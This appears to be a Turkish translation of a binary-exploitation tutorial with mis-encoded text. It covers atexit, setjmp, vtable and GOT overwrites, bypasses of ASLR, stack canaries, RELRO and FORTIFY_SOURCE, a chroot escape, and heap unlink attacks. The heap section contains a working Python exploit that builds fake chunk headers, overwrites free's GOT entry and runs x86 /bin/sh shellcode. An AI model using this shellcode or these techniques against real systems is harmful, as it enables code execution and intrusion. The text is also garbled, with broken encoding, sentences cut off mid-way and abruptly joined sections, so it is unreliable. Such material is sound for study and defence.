**`atexit()`**, **diÄŸer iÅŸlevlerin parametre olarak geÃ§irildiÄŸi bir iÅŸlevdir**. Bu **iÅŸlevler**, bir **`exit()`** veya **main'in dÃ¶nÃ¼ÅŸÃ¼** gerÃ§ekleÅŸtiÄŸinde **Ã§alÄ±ÅŸtÄ±rÄ±lacak**.\
Ã–rneÄŸin, bu iÅŸlevlerden herhangi birinin adresini bir shellcode'a yÃ¶nlendirebilirseniz, **sÃ¼recin kontrolÃ¼nÃ¼ ele geÃ§irebilirsiniz**, ancak bu ÅŸu anda daha karmaÅŸÄ±k bir durumdur.\
Åu anda **Ã§alÄ±ÅŸtÄ±rÄ±lacak iÅŸlevlerin adresleri**, birkaÃ§ yapÄ± tarafÄ±ndan **gizlenir** ve sonunda iÅŸaret ettiÄŸi adresler iÅŸlevlerin adresleri deÄŸildir, ancak **XOR ile ÅŸifrelenir** ve rastgele bir anahtarla kaydÄ±rÄ±lÄ±r. Bu nedenle, bu saldÄ±rÄ± vektÃ¶rÃ¼ ÅŸu anda **en azÄ±ndan x86** ve **x64\_86** Ã¼zerinde Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.\
**Åifreleme iÅŸlevi**, **`PTR_MANGLE`**'dÄ±r. m68k, mips32, mips64, aarch64, arm, hppa gibi **diÄŸer mimariler**, bu **ÅŸifreleme iÅŸlevini uygulamaz** Ã§Ã¼nkÃ¼ girdi olarak aldÄ±ÄŸÄ± gibi **aynÄ± deÄŸeri dÃ¶ndÃ¼rÃ¼r**. Bu nedenle, bu mimariler bu vektÃ¶rle saldÄ±rÄ±labilir olur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`Setjmp()`**, **baÄŸlamÄ±** (kaydedilen kaydedici deÄŸerleri) **kaydetmeyi saÄŸlar**.\
**`longjmp()`**, **baÄŸlamÄ±** (kaydedilen kaydedici deÄŸerleri) **geri yÃ¼klemeyi saÄŸlar**.\
**Kaydedilen kaydedici deÄŸerleri**, `EBX, ESI, EDI, ESP, EIP, EBP`'dir.\
Ancak EIP ve ESP, **`PTR_MANGLE`** iÅŸlevinden geÃ§irilir, bu nedenle bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olan mimariler yukarÄ±da belirtilenlerle aynÄ±dÄ±r.\
Hata kurtarma veya kesmeler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak, okuduklarÄ±ma gÃ¶re, diÄŸer kaydedici deÄŸerleri korunmaz, bu nedenle Ã§aÄŸrÄ±lan iÅŸlevin iÃ§inde bir `call ebx`, `call esi` veya `call edi` varsa, kontrol ele geÃ§irilebilir. Veya EBP deÄŸiÅŸtirilerek ESP deÄŸiÅŸtirilebilir.

**C++'da VTable ve VPTR**

Her sÄ±nÄ±fÄ±n, yÃ¶ntemlere iÅŸaret eden bir dizi olan bir **Vtable**'Ä± vardÄ±r.

Her bir **sÄ±nÄ±fÄ±n nesnesi**, sÄ±nÄ±fÄ±nÄ±n dizisine iÅŸaret eden bir **VPtr**'ye sahiptir. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle VPtr'nin Ã¼zerine yazma baÅŸarÄ±lÄ± olursa, bir iÅŸlevi Ã§alÄ±ÅŸtÄ±rmak iÃ§in shellcode'a yÃ¶nlendirilebilir.

## **Ã–nleyici Ã–nlemler ve KaÃ§Ä±ÅŸlar**

**ASLR pek rastgele deÄŸil**

PaX, iÅŸlem adres alanÄ±nÄ± 3 gruba bÃ¶ler:

BaÅŸlatÄ±lan ve baÅŸlatÄ±lmayan kod ve veriler: .text, .data ve .bss â€”> delta\_exec deÄŸiÅŸkeninde 16 bit entropi, bu deÄŸiÅŸken her iÅŸlemle rastgele olarak baÅŸlatÄ±lÄ±r ve baÅŸlangÄ±Ã§ adreslerine eklenir

mmap() tarafÄ±ndan ayrÄ±lan bellek ve paylaÅŸÄ±lan kÃ¼tÃ¼phaneler â€”> 16 bit, delta\_mmap

YÄ±ÄŸÄ±n â€”> 24 bit, delta\_stack â€”> AslÄ±nda 11 (10. bayttan 20. bayta kadar dahil) â€”> 16 bayt hizalanmÄ±ÅŸ â€”> YÄ±ÄŸÄ±nÄ±n 524.288 gerÃ§ek adresi mÃ¼mkÃ¼n

Ortam deÄŸiÅŸkenleri ve argÃ¼manlar, yÄ±ÄŸÄ±nda bir tamponun altÄ±nda kayarlar.

**Return-into-printf**

Bu, bir tampon taÅŸmasÄ±nÄ± bir format dizesi hatasÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in bir tekniktir. EIP'nin, iÅŸlevin printf'ine iÅŸaret etmesi iÃ§in deÄŸiÅŸtirilmesi ve iÅŸlemin durumu hakkÄ±nda deÄŸerler elde etmek iÃ§in manipÃ¼le edilmiÅŸ bir format dizesinin argÃ¼man olarak geÃ§irilmesiyle yapÄ±lÄ±r.

**KÃ¼tÃ¼phanelere SaldÄ±rÄ±**

KÃ¼tÃ¼phaneler, 16 bit rastgelelikle bir konumda bulunur = 65636 olasÄ± adres. SavunmasÄ±z bir sunucu fork() Ã§aÄŸÄ±rÄ±rsa, bellek adres alanÄ± Ã§ocuk sÃ¼reÃ§te kopyalanÄ±r ve dokunulmaz kalÄ±r. Bu nedenle, libc'nin usleep() iÅŸlevine "16" argÃ¼manÄ± geÃ§irerek brute force saldÄ±rÄ±sÄ± yapÄ±labilir, bÃ¶ylece normalden daha uzun sÃ¼rede yanÄ±t verirse, bu iÅŸlev bulunmuÅŸ olur. Bu iÅŸlevin nerede olduÄŸu bilindiÄŸinde, delta\_mmap elde edilebilir ve diÄŸerleri hesaplanabilir.

ASLR'nin Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olmanÄ±n tek yolu 64 bit mimari kullanmaktÄ±r. Orada brute force saldÄ±rÄ±larÄ± yoktur.

**StackGuard ve StackShield**

**StackGuard**, EIP'nin Ã¶nÃ¼ne yerleÅŸtirir â€”> 0x000aff0d(null, \n, EndOfFile(EOF), \r) â€”> recv(), memcpy(), read(), bcoy() hala savunmasÄ±zdÄ±r ve EBP'yi korumaz

**StackShield**, StackGuard'dan daha karmaÅŸÄ±ktÄ±r

TÃ¼m dÃ¶nÃ¼ÅŸ EIP adreslerini bir tabloda (Global Return Stack) saklar, bÃ¶ylece tampon taÅŸmasÄ± hiÃ§bir zarara neden olmaz. AyrÄ±ca, her iki adres de karÅŸÄ±laÅŸtÄ±rÄ±labilir, bÃ¶ylece bir taÅŸma olup olmadÄ±ÄŸÄ± kontrol edilebilir.

DÃ¶nÃ¼ÅŸ adresi, bir sÄ±nÄ±ra karÅŸÄ± kontrol edilebilir, bÃ¶ylece EIP'nin veri alanÄ± gibi normalden farklÄ± bir yere gitmesi durumunda bilinir. Ancak bunu Ret-to-lib, ROP veya ret2ret ile atlatabilirsiniz.

StackShield'Ä±n yerel deÄŸiÅŸkenleri korumadÄ±ÄŸÄ± da gÃ¶rÃ¼lebilir.

**Stack Smash Protector (ProPolice) -fstack-protector**

Canary, EBP'nin Ã¶nÃ¼ne yerleÅŸtirilir. TamponlarÄ±n diÄŸer deÄŸiÅŸkenleri Ã¼zerine yazÄ±lmamasÄ± iÃ§in yerel deÄŸiÅŸkenler yeniden dÃ¼zenlenir.

AyrÄ±ca, yÄ±ÄŸÄ±nÄ±n Ã¼zerinde (yerel deÄŸiÅŸkenlerin Ã¼zerinde) geÃ§irilen argÃ¼manlarÄ±n gÃ¼venli bir kopyasÄ±nÄ± yapar ve bu kopyalarÄ± argÃ¼man olarak kullanÄ±r.

8 veya daha az Ã¶ÄŸeye sahip dizileri veya kullanÄ±cÄ± yapÄ±sÄ±nÄ±n bir parÃ§asÄ± olan tamponlarÄ± koruyamaz.

Canary, "/dev/urandom" dosyasÄ±ndan alÄ±nan rastgele bir sayÄ±dÄ±r veya 0xff0a0000'dir. TLS (Thread Local Storage) iÃ§inde depolanÄ±r. Ä°ÅŸ parÃ§acÄ±klarÄ± aynÄ± bellek alanÄ±nÄ± paylaÅŸÄ±r, TLS, her iÅŸ parÃ§acÄ±ÄŸÄ±nÄ±n kÃ¼resel veya statik
### Relro

**Relro (Salt Okunur YerleÅŸtirme)**, bellek izinlerini NX ile benzer ÅŸekilde etkiler. Fark, NX ile yÄ±ÄŸÄ±nÄ± yÃ¼rÃ¼tÃ¼lebilir hale getirirken, RELRO belirli ÅŸeyleri salt okunur hale getirir, bÃ¶ylece onlara yazamayÄ±z. Bu engelin en yaygÄ±n ÅŸekilde karÅŸÄ±laÅŸÄ±ldÄ±ÄŸÄ± durum, daha sonra ele alÄ±nacak olan bir `got` tablosu Ã¼zerine yazma iÅŸlemini engellemesidir. `got` tablosu, libc iÅŸlevlerinin adreslerini tutar, bÃ¶ylece ikili dosya bu adresleri biliyor ve onlarÄ± Ã§aÄŸÄ±rabiliyor. Åimdi, relro ile ve relro olmadan bir ikili dosyanÄ±n `got` tablosu giriÅŸi iÃ§in bellek izinlerinin nasÄ±l gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ne bakalÄ±m.

Relro ile:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Relro olmadan:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
**Relro olmayan** ikili iÃ§in, `fgets` iÃ§in `got` giriÅŸ adresinin `0x404018` olduÄŸunu gÃ¶rebiliriz. Bellek eÅŸlemelerine baktÄ±ÄŸÄ±mÄ±zda, bu adresin `0x404000` ve `0x405000` arasÄ±na dÃ¼ÅŸtÃ¼ÄŸÃ¼nÃ¼ gÃ¶rÃ¼yoruz ve bu alanÄ±n **`rw`** izinlerine sahip olduÄŸunu, yani okuyup yazabileceÄŸimizi gÃ¶sterir. **Relro olan** ikili iÃ§in, ikilinin Ã§alÄ±ÅŸtÄ±ÄŸÄ± `got` tablosu adresi (pie etkin olduÄŸu iÃ§in bu adres deÄŸiÅŸecektir) `0x555555557fd0` olarak gÃ¶rÃ¼lÃ¼yor. Bu ikilinin bellek eÅŸlemesinde, `0x0000555555557000` ve `0x0000555555558000` arasÄ±na dÃ¼ÅŸer ve bu alanÄ±n bellek **izinlerinin `r`** olduÄŸunu, yani sadece okuyabileceÄŸimizi gÃ¶sterir.

Peki **geÃ§iÅŸ** nasÄ±l saÄŸlanÄ±r? Ben genellikle relro nedeniyle salt okunur hale getirilen bellek bÃ¶lgelerine yazmamaya Ã§alÄ±ÅŸÄ±rÄ±m ve **kod yÃ¼rÃ¼tme iÃ§in farklÄ± bir yol bulurum**.

Bunun gerÃ§ekleÅŸebilmesi iÃ§in ikilinin yÃ¼rÃ¼tÃ¼lmeden Ã¶nce iÅŸlevlerin adreslerini bilmesi gerekmektedir:

* Tembel baÄŸlama: Bir iÅŸlev Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, iÅŸlevin adresi ilk kez aranÄ±r. Bu nedenle, GOT'un yÃ¼rÃ¼tme sÄ±rasÄ±nda yazma izinlerine sahip olmasÄ± gerekir.
* Åimdi baÄŸlama: Ä°ÅŸlevlerin adresleri yÃ¼rÃ¼tmenin baÅŸÄ±nda Ã§Ã¶zÃ¼lÃ¼r, ardÄ±ndan .got, .dtors, .ctors, .dynamic, .jcr gibi hassas bÃ¶lÃ¼mlere salt okunur izinler verilir. `` `** ``-z relro`**`y`**`-z now\`\*\*

Bir programÄ±n Åimdi baÄŸlama kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in ÅŸunu yapabilirsiniz:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
# Linux Exploit Temel ESP SÃ¶mÃ¼rÃ¼sÃ¼

Bir ikili belleÄŸe yÃ¼klendiÄŸinde ve bir iÅŸlev ilk kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, PLT'ye (Procedure Linkage Table) atlanÄ±r ve buradan GOT'a (Global Offset Table) bir atlayÄ±ÅŸ (jmp) yapÄ±lÄ±r. GOT giriÅŸinin Ã§Ã¶zÃ¼lmediÄŸi (PLT'nin bir sonraki adresini iÃ§eren) tespit edilir. Bu durumda, Runtime Linker veya rtfd Ã§aÄŸrÄ±lÄ±r ve adresi Ã§Ã¶zerek GOT'ta saklar.

Bir iÅŸlev Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, PLT Ã§aÄŸrÄ±lÄ±r ve iÅŸlevin adresinin depolandÄ±ÄŸÄ± GOT adresine yÃ¶nlendirilir, bÃ¶ylece iÅŸlev Ã§aÄŸrÄ±lÄ±r. Ancak, iÅŸlev ilk kez Ã§aÄŸrÄ±lÄ±yorsa, GOT'ta PLT'nin bir sonraki talimatÄ± bulunur, bu nedenle akÄ±ÅŸ PLT kodunu (rtfd) takip eder ve iÅŸlevin adresini bulur, GOT'ta saklar ve Ã§aÄŸÄ±rÄ±r.

Bir ikili belleÄŸe yÃ¼klendiÄŸinde, derleyiciye program Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda yÃ¼klenmesi gereken verilerin hangi ofsette olmasÄ± gerektiÄŸi sÃ¶ylenir.

Tembel baÄŸlama (Lazy binding) -> Ä°ÅŸlevin adresi, iÅŸlev ilk kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda aranÄ±r, bu nedenle GOT, arandÄ±ÄŸÄ±nda oraya kaydedilmesi iÃ§in yazma izinlerine sahiptir ve tekrar aranmasÄ± gerekmez.

Åimdi baÄŸlama (Bind now) -> Ä°ÅŸlev adresleri program yÃ¼klenirken aranÄ±r ve .got, .dtors, .ctors, .dynamic, .jcr bÃ¶lÃ¼mlerinin izinleri yalnÄ±zca okunabilir olarak deÄŸiÅŸtirilir. **-z relro** ve **-z now**

Bununla birlikte, genellikle programlar bu seÃ§eneklerle karmaÅŸÄ±klaÅŸtÄ±rÄ±lmamÄ±ÅŸtÄ±r, bu nedenle bu saldÄ±rÄ±lar hala mÃ¼mkÃ¼ndÃ¼r.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> BIND NOW kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in

**Fortify Source -D_FORTIFY_SOURCE=1 or =2**

GÃ¼vensiz bir ÅŸekilde bir yerden baÅŸka bir yere kopyalayan iÅŸlevleri tanÄ±mlamaya Ã§alÄ±ÅŸÄ±r ve iÅŸlevi gÃ¼venli bir iÅŸlevle deÄŸiÅŸtirir.

Ã–rneÄŸin:\
char buf[16];\
strcpy(buf, source);

Bu, gÃ¼vensiz olarak tanÄ±mlanÄ±r ve sonra strcpy() yerine \_\_strcpy\_chk() kullanÄ±larak tamponun maksimum kopyalanacak boyutu olarak tamponun boyutu kullanÄ±larak deÄŸiÅŸtirilir.

**=1** veya **=2** arasÄ±ndaki fark ÅŸudur:

Ä°kincisi, **%n**'nin yazma izinlerine sahip bir bÃ¶lÃ¼mden gelmesine izin vermez. AyrÄ±ca, argÃ¼manlara doÄŸrudan eriÅŸim parametresi yalnÄ±zca Ã¶nceki parametreler kullanÄ±ldÄ±ÄŸÄ±nda kullanÄ±labilir, yani yalnÄ±zca **%2$d** ve **%1$d** kullanÄ±ldÄ±ysa **%3$d** kullanÄ±labilir.

Hata mesajÄ±nÄ± gÃ¶stermek iÃ§in argv\[0] kullanÄ±lÄ±r, bu nedenle baÅŸka bir yerin adresini (bir global deÄŸiÅŸken gibi) argv\[0] iÃ§ine koyarsanÄ±z, hata mesajÄ± o deÄŸiÅŸkenin iÃ§eriÄŸini gÃ¶sterecektir. Sayfa 191

**Libsafe'in Yerine GeÃ§irilmesi**

Åu ÅŸekilde etkinleÅŸtirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

BazÄ± gÃ¼vensiz iÅŸlevlerin Ã§aÄŸrÄ±larÄ±, gÃ¼venli iÅŸlevlerle deÄŸiÅŸtirilir. StandartlaÅŸtÄ±rÄ±lmamÄ±ÅŸtÄ±r. (yalnÄ±zca x86 iÃ§in, -fomit-frame-pointer ile derlenmiÅŸ olmayanlar, statik derlemeler iÃ§in deÄŸil, tÃ¼m gÃ¼vensiz iÅŸlevler gÃ¼venli hale getirilmez ve LD\_PRELOAD suid ile Ã§alÄ±ÅŸan ikililerde Ã§alÄ±ÅŸmaz).

**ASCII Armored Address Space**

PaylaÅŸÄ±lan kitaplÄ±klarÄ±n 0x00000000 ile 0x00ffffff arasÄ±nda yÃ¼klenmesiyle her zaman bir 0x00 baytÄ± olmasÄ±nÄ± saÄŸlar. Bununla birlikte, bu neredeyse hiÃ§bir saldÄ±rÄ±yÄ± durdurmaz, Ã¶zellikle little endian iÃ§in geÃ§erli deÄŸildir.

**ret2plt**

Bu, strcpy@plt iÅŸlevini (plt'den) Ã§aÄŸÄ±rmak ve GOT giriÅŸine iÅŸaret etmek ve Ã§aÄŸrÄ±lmak istenen iÅŸlevin (system()) ilk baytÄ±nÄ± kopyalamak iÃ§in bir ROP gerÃ§ekleÅŸtirir. ArdÄ±ndan, GOT+1'e iÅŸaret ederek system() iÅŸlevinin ikinci baytÄ±nÄ± kopyalar... Sonunda, GOT'ta saklanan adresi (system()) Ã§aÄŸÄ±rÄ±r.

**YanÄ±ltÄ±cÄ± EBP**

EBP'yi argÃ¼manlara iÅŸaret etmek iÃ§in kullanÄ±lan bir kayÄ±t olarak kullanan iÅŸlevlerde, EIP'yi deÄŸiÅŸtirerek system() iÅŸlevine iÅŸaret etmek iÃ§in EBP'nin de deÄŸiÅŸtirilmiÅŸ olmasÄ± gerekir. EBP'nin, herhangi iki bayt ve ardÄ±ndan &"/bin/sh" adresine iÅŸaret eden bir bellek bÃ¶lgesine iÅŸaret etmesi gerekir.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user -> Belirli bir alt dizin altÄ±nda temel bir sistem yÃ¼kler

Bir yÃ¶netici, bu kafeslerden birinden Ã§Ä±kmak iÃ§in ÅŸunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod EnstrÃ¼mantasyonu**

Valgrind -> HatalarÄ± bulur\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap TaÅŸmalarÄ±: Temel SÃ¶mÃ¼rÃ¼ler**

**AyrÄ±lan ParÃ§a**

prev\_size |\
size | - BaÅŸlÄ±k\
\*mem | Veriler

**BoÅŸ ParÃ§a**

prev\_size |\
size |\
\*fd | Ä°leri parÃ§a iÅŸaretÃ§isi\
\*bk | Geri parÃ§a iÅŸaretÃ§isi - BaÅŸlÄ±k\
\*mem | Veriler

BoÅŸ parÃ§alar Ã§ift yÃ¶nlÃ¼ bir liste (bin) iÃ§inde bulunur ve ardÄ±ÅŸÄ±k boÅŸ parÃ§alar olamaz (birleÅŸtirilirler).

"size" alanÄ±nda ÅŸunlarÄ± belirtmek iÃ§in bitler bulunur: Ã–nceki parÃ§a kullanÄ±mda mÄ±, parÃ§a mmap() ile ayrÄ±ldÄ± mÄ± ve parÃ§anÄ±n birincil arenaya ait olup olmadÄ±ÄŸÄ±.

Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, yanÄ±ndaki parÃ§alar boÅŸsa, bunlar unlink() makrosuyla birleÅŸtirilir ve daha bÃ¼yÃ¼k yeni bir parÃ§a, uygun bin'e eklenmek Ã¼zere frontlink() tarafÄ±ndan alÄ±nÄ±r.

unlink(){\
BK = P->bk; -> Yeni parÃ§anÄ±n BK'si, Ã¶nceden boÅŸ olanÄ±n BK'sidir\
FD = P->fd; -> Yeni parÃ§anÄ±n FD'si, Ã¶nceden boÅŸ olanÄ±n FD'sidir\
FD->bk = BK; -> Sonraki parÃ§anÄ±n BK'si yeni parÃ§aya iÅŸaret eder\
BK->fd = FD; -> Ã–nceki parÃ§anÄ±n FD'si yeni parÃ§aya iÅŸaret eder\
}

Bu nedenle, P->bk'yi bir shellcode adresiyle ve P->fd'yi GOT veya DTORS'taki bir giriÅŸ adresiyle deÄŸiÅŸtirerek ÅŸunu baÅŸarabiliriz:

BK = P->bk = &shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = &shellcode

Ve bÃ¶ylece programdan Ã§Ä±k
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nemli olan, Ã¶nceki parÃ§anÄ±n serbest olduÄŸunu gÃ¶steren bitin 1 olduÄŸu**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3. parÃ§anÄ±n "size"Ä±nÄ±n 4 bayt geride olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in (prev\_size'Ä±n olduÄŸu yere bakar)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da baÅŸta 8 bayt dolgu koyuyoruz**

**got\_free = pack("\<I", 0x08048300 - 12) #free() fonksiyonunun plt-12 adresi (free ikinci kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda shellcode'un Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ± adresin Ã¼zerine yazÄ±lacak adres)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload'Ä±n baÅŸÄ±nda 8 bayt dolgu olduÄŸu sÃ¶ylendiÄŸi gibi**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§a deÄŸiÅŸtiriliyor, got\_free, addr\_sc + 12 adresini kaydedeceÄŸimiz yere iÅŸaret ediyor**

**os.system("./8.3.o " + payload)**

**unset() ters sÄ±rayla serbest bÄ±rakma (wargame)**

3 ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve sÄ±rasÄ±yla serbest bÄ±rakÄ±lÄ±yorlar.

Bu durumda:

c parÃ§asÄ±na shellcode yerleÅŸtirilir

a parÃ§asÄ±nÄ±, size alanÄ±nÄ±n PREV\_INUSE bitinin devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± ÅŸekilde b'nin Ã¼zerine yazmak iÃ§in kullanÄ±yoruz, bÃ¶ylece a parÃ§asÄ±nÄ±n serbest olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼yor.

AyrÄ±ca, b'nin baÅŸlÄ±k kÄ±smÄ±na size deÄŸeri -4 olacak ÅŸekilde yazÄ±lÄ±r.

SonuÃ§ olarak, program "a"nÄ±n bir binde serbest olduÄŸunu dÃ¼ÅŸÃ¼nerek unlink() Ã§aÄŸÄ±rÄ±r. Ancak, Ã§Ã¼nkÃ¼ PREV\_SIZE baÅŸlÄ±ÄŸÄ± -4 olarak ayarlanÄ±r. "a" parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necektir. Yani, b+4'te baÅŸlayan bir parÃ§ayÄ± unlink() yapacak, bu nedenle bk'da shellcode adresi ve fd'de "puts()" fonksiyonunun adresi-12 olacak ÅŸekilde payload'umuz oluÅŸur.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki hiÃ§bir parÃ§a serbest deÄŸilse, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ±lan malloc hiÃ§bir zaman serbest bÄ±rakÄ±lmazsa yararlÄ± bir zayÄ±flÄ±ktÄ±r (free()).

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸma yapabilen bir tampon

Bu tampona bitiÅŸik bir tampon, serbest bÄ±rakÄ±lacak ve Ã¶nceki tamponun fd alanÄ± bu tamponun taÅŸmasÄ±ndan dolayÄ± deÄŸiÅŸtirilecek

512'den bÃ¼yÃ¼k ancak Ã¶nceki tampona gÃ¶re daha kÃ¼Ã§Ã¼k bir boyuta sahip bir tampon serbest bÄ±rakÄ±lacak

3. adÄ±mdan Ã¶nce tanÄ±mlanan bir tampon, bu tamponun prev\_size'Ä±nÄ± Ã¼zerine yazmamÄ±zÄ± saÄŸlayacak ÅŸekilde

